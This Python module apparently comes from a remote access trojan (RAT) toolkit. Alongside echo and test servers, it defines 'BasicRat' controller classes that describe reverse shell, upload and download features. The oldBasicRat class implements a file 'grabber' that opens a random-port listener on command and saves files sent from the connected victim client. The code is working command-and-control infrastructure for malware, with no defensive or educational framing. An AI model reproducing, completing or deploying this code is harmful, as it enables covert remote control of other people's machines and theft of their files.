import socket
import os
from threading import Thread
from time import sleep
from random import randint
from .server_template import BasicTemplate, AdvTemplate

class EchoServer(BasicTemplate):
    SERV_TYPE = "Echo"
    INFO_SERV = "Simple Echo Server"

    def __init__(self, main_pipe, **kwargs):
        super().__init__(main_pipe, **kwargs)
        self._ext_config = {}

    def show_config(self):
        config = super()._show_config()
        config["SERV_TYPE"] = self.SERV_TYPE
        config["INFO_SERV"] = self.INFO_SERV
        return config
    
    def _listen_for_msg(self, handler):
        while self._listen_FLAG:
            try:
                msg = self._recive_msg(handler)
            except OSError:
                self.Msg(f"\n[{self.name}] Recive from {handler.Addr} Abort !\n")
                break
            if not msg:
                break
            if msg == "":
                continue
            else:
                self.Msg(f"\nMsg from: {handler.Addr}\n{msg}\n")
                self.Msg(f"[{self.name}] Send response to: {handler.Addr} ....")
                sleep(0.5)
                self._send_msg(msg, handler)
                break

        self.Msg(f"Close Connection: {self._close_target_conn(handler)}\n")
    
    
class TestServer(BasicTemplate):
    SERV_TYPE = "Test"
    INFO_SERV = "Test Server"

    def __init__(self, main_pipe, **kwargs):
        super().__init__(main_pipe, **kwargs)
    
    def show_config(self):
        config = super()._show_config()
        config["SERV_TYPE"] = self.SERV_TYPE
        config["INFO_SERV"] = self.INFO_SERV
        return config


class oldBasicRat(BasicTemplate):
    SERV_TYPE = "BasicRat"
    INFO_SERV = "Server for Basic Rat. Can made rat with reverse shell cmd"

    def __init__(self, main_pipe, **kwargs):
        super().__init__(main_pipe, **kwargs)
        self.out_dir = os.path.join(self._output_dir, self.name)
        self._cmd_client = None
        self.graber_socket = None
        self.make_dirs()

    def make_dirs(self):
        if not os.path.exists(self.out_dir):
            os.mkdir(self.out_dir)

    def show_config(self):
        config = super()._show_config()
        config["SERV_TYPE"] = self.SERV_TYPE
        config["INFO_SERV"] = self.INFO_SERV
        return config
    
    def exec_sys_command(self, handler, command):
        ccmd = self._unpack_sys_cmd(command)
        if ccmd[0] == "grab":
            self._make_grabber_socket(handler, ccmd[1], ccmd[2])
            return True
        else:
            return False
    
    def _make_grabber_socket(self, handler, flen, fname):
        self.Msg("MAKE GRABER SERVER")
        count = 0
        try:
            self.graber_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.graber_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except OSError as e:
            self.Msg(f"[{self.name}] ERROR: Graber cant make socket: {e}", level=True)
            self.graber_socket = None
            return False
        while True:
            self.Msg(f"Count: {count}")
            if count > 100:
                self.graber_socket = None
                break
            _port = randint(1200, 9999)
            try:
                self.graber_socket.bind((self._ip, _port))
                self.Msg("GRABER BIND")
                break
            except OSError:
                count +=1
                continue
        if not self.graber_socket:
            return False
        else:
            self._send_msg(f"{str(_port)}", handler)
            graber = Thread(target=self._waiting_for_file, args=(flen, fname), daemon=True)
            graber.start()
            return True
        
    
    def _waiting_for_file(self, flen, fname):
        self.Msg("waiting for file")
        flen = int(float(flen))
        try:
            self.graber_socket.listen(1)
        except OSError as e:
            self.Msg(f"[{self.name}] ERROR: Graber Socket Listening: {e}", level=True)
            return False
        conn, addr = self.graber_socket.accept()
        self.Msg(f"[{self.name}] Start Download File: {fname}")
        sleep(0.5)
        item = b""
        while len(item) < flen:
            buff = conn.recv(flen - len(item))
            if not buff:
                return None
            self.Msg(f"LEN ITEMS: {len(item)}")
            item += buff

        self._save_item(fname, item)
        try:
            self.graber_socket.shutdown(socket.SHUT_RDWR)
            self.graber_socket.close()
        except:
            pass
        self.graber_socket = None

        
    def _save_item(self, fname, data):
        with open(os.path.join(self.out_dir, fname), "wb") as f:
            f.write(data)
        self.Msg(f"[{self.name}] Item {fname} save successfull")



class TestAdv(AdvTemplate):
    SERV_TYPE = "Adv"
    INFO_SERV = "Adv template test"

    def __init__(self, main_pipe, **kwargs):
        super().__init__(main_pipe, **kwargs)
    
    def show_config(self):
        config = super()._show_config()
        config["SERV_TYPE"] = self.SERV_TYPE
        config["INFO_SERV"] = self.INFO_SERV
        return config
    
    
class BasicRat(AdvTemplate):
    SERV_TYPE = "BasicRat"
    INFO_SERV = "Server for Basic Rat. Can made RAT with base command: upload, download files and Reverse Shell CMD"

    def __init__(self, main_pipe, **kwargs):
        super().__init__(main_pipe, **kwargs)
    
    def show_config(self):
        config = super()._show_config()
        config["SERV_TYPE"] = self.SERV_TYPE
        config["INFO_SERV"] = self.INFO_SERV
        return config
    
    